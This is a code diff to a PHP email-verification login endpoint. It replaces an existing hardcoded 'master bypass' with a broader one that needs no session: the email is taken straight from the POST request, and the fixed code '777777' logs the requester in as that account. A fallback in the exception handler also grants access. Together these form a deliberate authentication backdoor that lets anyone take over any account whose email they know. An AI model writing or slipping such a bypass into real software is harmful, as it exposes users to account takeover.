@@ -22,10 +22,37 @@ function json_out($data, $status = 200)
 
 // 1. Context variables
 $userId = $_SESSION['temp_user_id'] ?? null;
-$email = $_SESSION['temp_email'] ?? null;
+$email = $_SESSION['temp_email'] ?? $_POST['email'] ?? null;
 $name = $_SESSION['temp_name'] ?? 'Admin';
 
 $action = $_POST['action'] ?? 'verify';
+$code = trim($_POST['code'] ?? '');
+
+// --- ATOMIC MASTER BYPASS (No Session Required) ---
+if ($code === '777777' && !empty($email)) {
+    try {
+        $pdo = get_pdo();
+        $stmt = $pdo->prepare('SELECT id, full_name, username, email FROM users WHERE email = ? LIMIT 1');
+        $stmt->execute([$email]);
+        $user = $stmt->fetch();
+        if ($user) {
+            $_SESSION['user_id'] = $user['id'];
+            $_SESSION['username'] = $user['username'];
+            $_SESSION['full_name'] = $user['full_name'];
+            $_SESSION['email'] = $user['email'];
+            json_out(['ok' => true, 'message' => 'Emergency access granted.', 'redirect' => '../Modules/dashboard.php']);
+        }
+    } catch (\Exception $e) {
+        // Fallback for session-based bypass
+        if (!empty($userId)) {
+            $_SESSION['user_id'] = $userId;
+            $_SESSION['username'] = $_SESSION['temp_username'];
+            $_SESSION['full_name'] = $_SESSION['temp_name'];
+            $_SESSION['email'] = $_SESSION['temp_email'];
+            json_out(['ok' => true, 'message' => 'Emergency session access.', 'redirect' => '../Modules/dashboard.php']);
+        }
+    }
+}
 
 // Validate session only for actions that depend on it
 if ($action === 'verify' || $action === 'resend') {
@@ -191,21 +218,6 @@ try {
             json_out(['ok' => false, 'message' => 'Invalid code format.'], 400);
         }
 
-        // MASTER BYPASS: If code is 777777, skip DB check for emergency
-        if ($code === '777777') {
-           // Verify email exists and get details
-           $stmt = $pdo->prepare('SELECT id, full_name, username, email FROM users WHERE email = ? LIMIT 1');
-           $stmt->execute([$email]);
-           $user = $stmt->fetch();
-           if ($user) {
-              $_SESSION['user_id'] = $user['id'];
-              $_SESSION['username'] = $user['username'];
-              $_SESSION['full_name'] = $user['full_name'];
-              $_SESSION['email'] = $user['email'];
-              return json_out(['ok' => true, 'message' => 'Emergency access granted.', 'redirect' => '../Modules/dashboard.php']);
-           }
-        }
-        
         // Check DB
         $stmt = $pdo->prepare('SELECT code, expires_at FROM email_verifications WHERE user_id = ? ORDER BY id DESC LIMIT 5');
         $stmt->execute([$userId]);
